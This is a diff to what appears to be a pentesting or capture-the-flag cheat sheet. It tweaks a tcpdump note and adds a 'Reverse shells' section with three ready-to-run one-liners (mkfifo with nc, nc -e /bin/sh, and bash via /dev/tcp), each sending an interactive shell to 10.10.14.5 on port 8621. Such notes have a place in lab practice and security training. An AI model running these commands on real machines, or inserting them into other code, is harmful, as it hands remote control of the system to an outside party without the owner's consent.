@@ -91,8 +91,18 @@ source my_env/bin/activate
 
 ## tcpdump
 ```sh
-# to verify that your machine gets ping'ed but something (e.g. your malicious remote command)
+# to verify that your machine gets ping'ed (e.g. by your malicious remote "ping" command)
 sudo tcpdump ip proto \\icmp -i tun0
+```
+## Reverse shells
+
+```sh
+# Works most of the time, useful when nc has no -e option
+/bin/rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 8621 >/tmp/f
+# Depends on the netcat version (some do not have -e)
+nc -e /bin/sh 10.10.14.5 8621
+# Try it, depends on bash
+bash -i >& /dev/tcp/10.10.14.5/8621 0>&1
 ```
 
 ## Socat
